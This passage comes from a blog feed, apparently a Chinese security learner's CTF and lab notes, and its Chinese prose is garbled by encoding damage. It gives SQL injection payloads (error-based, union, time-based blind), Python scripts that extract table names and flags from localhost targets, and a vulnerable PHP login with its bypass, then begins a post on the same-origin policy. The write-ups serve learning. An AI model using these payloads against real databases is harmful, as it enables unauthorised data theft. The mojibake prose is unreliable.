class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag:CNSS{SQl_1njecti0n}</p><h3 id="cnssæŠ¥é”™æ³¨å…¥åˆä½“éªŒ">cnssæŠ¥é”™æ³¨å…¥åˆä½“éªŒ</h3><p>æŠ¥é”™æ³¨å…¥çš„å‰ææ˜¯ç›®æ ‡å¼€å¯äº†é”™è¯¯æ˜¾ç¤º,æ¯”å¦‚æˆ‘ä»¬å¸å·è¾“å…¥admin',å¾—åˆ°è¿”å› <img src="/images/2017/11/cnss-2.png" /> é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥ å¸å·:admin' and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))# å¯†ç :éšæ„ å¾—åˆ°å›æ˜¾ <img src="/images/2017/11/cnss-3.png" /> è¯´æ˜æœ‰cnss,flag,userä¸‰å¼ è¡¨,ç„¶ååŒç›²æ³¨çˆ†å‡ºåˆ—å’Œå­—æ®µ <img src="/images/2017/11/cnss-4.png" /> è¿™é‡Œæä¸€ä¸ªæŠ¥é”™æ³¨å…¥æ–°å§¿åŠ¿,å¦‚æœçŸ¥é“åˆ—åæƒ³çˆ†å‡ºå½“å‰è¡¨å,å¯ä»¥ä½¿ç”¨polygon,æ¯”å¦‚ <img src="/images/2017/11/cnss-5.png" /></p><h3 id="cnss-unionæ³¨åˆä½“éªŒ">cnss unionæ³¨åˆä½“éªŒ</h3><p>unionæ³¨å…¥ä¸€èˆ¬ç”¨äºæœ‰å›æ˜¾çš„åœ°æ–¹,ç›´æ¥ç”¨unionæå–å‡ºæ‰€éœ€è¦çš„ä¿¡æ¯(è¿˜å¯ä»¥ç”¨äºç™»å½•æ—¶æ”¹å˜å¯†ç ,åç»­ä¼šæåˆ°) æ¯”å¦‚æˆ‘ä»¬çš„union.phpé‡Œé¢ <img src="/images/2017/11/cnss-6.png" /> æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨unionæå–ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">99&#x27; union select group_concat(table_name) from</span><br><span class="line"> information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p>è¿”å›ä¸º<img src="/images/2017/11/cnss-7.png" /> åé¢åŒç›²æ³¨çš„æå–æ–¹æ³•å³å¯</p><h3 id="cnsså»¶æ—¶æ³¨å…¥åˆä½“éªŒ">cnsså»¶æ—¶æ³¨å…¥åˆä½“éªŒ</h3><p>å»¶æ—¶æ³¨å…¥é€‚ç”¨çš„èŒƒå›´å¾ˆå¹¿,ä¸»è¦ç›®æ ‡æ²¡æœ‰è¿‡æ»¤å‡½æ•°,è€Œä¸”sqlè¯­å¥å¾—åˆ°äº†æ‰§è¡Œ,é‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°åˆ¤æ–­ ä¸¾ä¸ªæ —å­<img src="/images/2017/11/cnss-8.png" /> è¿™ç§å°±å¯ä»¥å»¶æ—¶æ³¨å…¥ åˆ©ç”¨if,if(æ¡ä»¶,æ¡ä»¶ä¸ºçœŸçš„è¿”å›,æ¡ä»¶ä¸ºå‡çš„è¿”å›) æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ifé‡Œé¢ç”¨ç›²æ³¨çš„æ–¹æ³•æ¥è·å–ä¿¡æ¯,ä½†æ˜¯æ³¨æ„,æ‰€å¾—ç­”æ¡ˆå¯èƒ½ä¼šå—ç½‘é€Ÿå½±å“,å¤šè¯•å‡ æ¬¡æ˜¯æ²¡é—®é¢˜çš„ ä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name)</span></span><br><span class="line"><span class="string">              from information_schema.tables where table_schema=database()</span></span><br><span class="line"><span class="string">              ),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(3),1)#&#x27;.format(num=num,ascii1=ord(each))&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                          </span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/sleep.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="mctfæ³¨å…¥1">MCTFæ³¨å…¥1</h3><p>è®°å½•è¿™é“é¢˜ä¸»è¦æ˜¯ä»è¿™é“é¢˜è§è¯†åˆ°äº†ä¸€ç§æ–°çš„ç™»å½•ä»£ç (åŸè°…æˆ‘è§è¯†å°‘...) <img src="/images/2017/11/cnss-9.png" /> å…·ä½“ä»£ç å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;connect.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/union select/i&#x27;</span>, <span class="variable">$username</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;username error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password_now</span> = <span class="variable">$result</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>!=<span class="variable">$password_now</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;password error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ­£åˆ™åªè¿‡æ»¤äº†ä¸€ä¸ªunion selectæ˜¯å› ä¸ºæˆ‘å¯¹è¿™ä¸ªå°è±¡æ¯”è¾ƒæ·±åˆ»,æ˜¯ç”¨æ‹¬å·ç»•è¿‡çš„,æ‰€ä»¥è¿™é‡Œåªå†™äº†è¿™ä¸€ä¸ª. ç„¶åè¿™ä¸ªåå°æ˜¯ç”¨usernameæ¥å–æ•°æ®,ç„¶åæ¯”å¯¹password,å¦‚æœæˆ‘ä»¬ç”¨unionæ¥æå–çš„è¯,å°±å¯ä»¥ç»•è¿‡å¯†ç äº†, å°±æ¯”å¦‚è¿™é“é¢˜,æˆ‘ä»¬è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union(select 1,1)#</span><br></pre></td></tr></table></figure><p>å¯†ç å¡«1,ç„¶åå°±æ²¡æœ‰æç¤ºé”™è¯¯äº†,äºæ˜¯å°±å¯ä»¥å¯¹å¯†ç è¿›è¡Œç›²æ³¨. å¸å·å¡«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;union(select 1,(ascii(sub(...))=..))#</span><br></pre></td></tr></table></figure><p>å¯†ç å¡«1,å¦‚æœåˆ¤æ–­æ­£ç¡®å°±æ²¡æœ‰å¯†ç é”™è¯¯çš„æç¤º,ç”±æ­¤è¿›è¡Œæ³¨å…¥. ç„¶åè¿™é“é¢˜æœ‰ä¸ªå‘,é‚£å°±æ˜¯è¿™ä¸ªè¡¨é‡Œé¢æ²¡æœ‰ä¸œè¥¿,æ‰€ä»¥å³ä½¿ä½ ç”¨æˆ·ååé¢and 1=1ä¹Ÿæ˜¯æŠ¥ç”¨æˆ·åé”™è¯¯.... æˆ‘å½“æ—¶å°±æ­»åœ¨äº†è¿™é‡Œ...å¯æƒœå¯æƒœ</p><h3 id="flappy-bird">flappy bird</h3><p>è¿™é“é¢˜æœ¬æ¥æˆ‘éƒ½åšå‡ºæ¥äº†...æˆ‘æƒ³åˆ°äº†åº”è¯¥æ˜¯æ›´æ–°åˆ†æ•°é‚£ä¸ªåœ°æ–¹å¯ä»¥æ³¨å…¥,æ— å¥ˆæˆ‘ä¸ä¼š...æ‰€ä»¥æ²¡æœ‰åš... è¿™æ¬¡è¡¥äº†ä¸€ä¸‹,å¯ä»¥å†™äº†.æ€»çš„æ¥è¯´è¿˜æ˜¯åœ¨è¾“å…¥åé¢åŠ ä¸Šifç„¶åæäº‹æƒ…å§æ¯”å¦‚è¿™é“flappy bird,è¿™é‡Œæˆ‘æ”¹æˆäº†update, updateçš„è¯åé¢å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((...),sleep(5),1)#</span><br></pre></td></tr></table></figure><p>æ¥æ³¨å…¥,è¿™é‡Œæˆ‘æ¢äº†ä¸€ä¸‹æ€è·¯,åé¢å¸¦çš„æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+if((...),10,1)#</span><br></pre></td></tr></table></figure><p>ç„¶åå¦‚æœåˆ†æ•°æ¶¨äº†10åˆ†,è¯´æ˜æ­£ç¡®,å¦åˆ™é”™è¯¯ ä¸»è¦ä»£ç å¦‚ä¸‹: å»¶æ—¶æ³¨å…¥çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">score=<span class="number">500</span></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score+=<span class="number">1</span></span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125; and if(ascii(substr((select flag from flag),</span></span><br><span class="line"><span class="string">        &#123;num&#125;,1))=&#123;ascii_sql&#125;,sleep(3),1)#&#x27;</span>.<span class="built_in">format</span>(score=score,num=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=each</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸åŠ è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    src=<span class="built_in">str</span>(src)</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">list1=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        score_now=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">        payload=<span class="string">&#x27;&#123;score&#125;+if(ascii(substr((select flag from flag),&#123;num1&#125;,1))=</span></span><br><span class="line"><span class="string">&#123;ascii_sql&#125;,10,1)#&#x27;</span>.<span class="built_in">format</span>(score=score_now,num1=num,ascii_sql=<span class="built_in">ord</span>(each))</span><br><span class="line">        check=md5(payload)</span><br><span class="line">        data=&#123;<span class="string">&#x27;score&#x27;</span>:payload,<span class="string">&#x27;check_code&#x27;</span>:check&#125;</span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>,data=data)</span><br><span class="line">        r=requests.get(<span class="string">&#x27;http://localhost:8080/flappy/game.php&#x27;</span>)</span><br><span class="line">        score_next=re.findall(<span class="string">r&#x27;&lt;strong&gt;(\d+)&lt;/strong&gt;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(score_next)-<span class="built_in">int</span>(score_now)==<span class="number">10</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(each))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cookieçš„è¡¥å……å­¦ä¹ </title>
      <link href="/2017/11/02/cookie%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/11/02/cookie%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="åŒæºç­–ç•¥">åŒæºç­–ç•¥</h3><p>æ‰€æœ‰æµè§ˆå™¨éƒ½å®è¡ŒåŒæºç­–ç•¥,å«ä¹‰å¤§æ¦‚å°±æ˜¯,Aç½‘é¡µè®¾ç½®çš„cookie,Bç½‘é¡µæ‰“ä¸å¼€,é™¤éè¿™ä¸¤ä¸ªç½‘é¡µ"åŒæº" æ‰€è°“çš„åŒæºå°±æ˜¯</p><blockquote><ul><li>åè®®ç›¸åŒ</li><li>åŸŸåç›¸åŒ</li><li>ç«¯å£ç›¸åŒ</li></ul></blockquote><p>ä¸¾ä¾‹æ¥è¯´:http://www.example.comçš„åè®®æ˜¯http,åŸŸåæ˜¯www.example.com,ç«¯å£80 ä»–çš„åŒæºæƒ…å†µå¦‚ä¸‹:</p><blockquote><ul><li>http://www.example.com/page.html(åŒæº)</li><li>http://example.com/page.html(ä¸åŒæº,åŸŸåä¸åŒ,www.example.comæ˜¯äºŒçº§åŸŸå)</li><li>https://www.example.com/page.html(ä¸åŒæº,åè®®ä¸åŒ,è¿™ä¸ªæ˜¯https,å‰é¢çš„æ˜¯http)</li><li>http://www.example.com:81/page.html(ä¸åŒæº,ç«¯å£ä¸åŒ,å‰é¢80,è¿™ä¸ª81)</li></ul></blockquote><h4 id="åŒæºç­–ç•¥çš„ç›®çš„">åŒæºç­–ç•¥çš„ç›®çš„</h4><p>åŒæºç­–ç•¥çš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·çš„å®‰å…¨,é˜²æ­¢æ¶æ„ç½‘ç«™çªƒå–cookieã€‚å¦‚æœæ²¡æœ‰åŒæºç­–ç•¥,Aç½‘ç«™çš„cookieå¯ä»¥åœ¨ç”¨æˆ·æµé‡Aåæµè§ˆBç½‘ç«™æ—¶è¢«Bè·å–,é‚£ä¹ˆAçš„cookieå°±å¯èƒ½è¢«Båˆ©ç”¨,è¿™æ ·å°±ä¼šå¯¼è‡´ä¸€äº›ä¸å¾—äº†çš„äº‹æƒ….</p><h4 id="é™åˆ¶èŒƒå›´">é™åˆ¶èŒƒå›´</h4><p>è€Œä¸”ç°åœ¨éšç€äº’è”ç½‘çš„å‘å±•,"åŒæºç­–ç•¥"è¶Šæ¥è¶Šä¸¥æ ¼,å¦‚æœä¸æ˜¯åŒæºçš„è¯,å…±æœ‰ä¸‰ç§è¡Œä¸ºä¼šå—é™åˆ¶</p><blockquote><ol type="1"><li>cookie,localstoragy,indexdbæ— æ³•è·å–</li><li>domæ— æ³•è·å–</li><li>ajaxè¯·æ±‚æ— 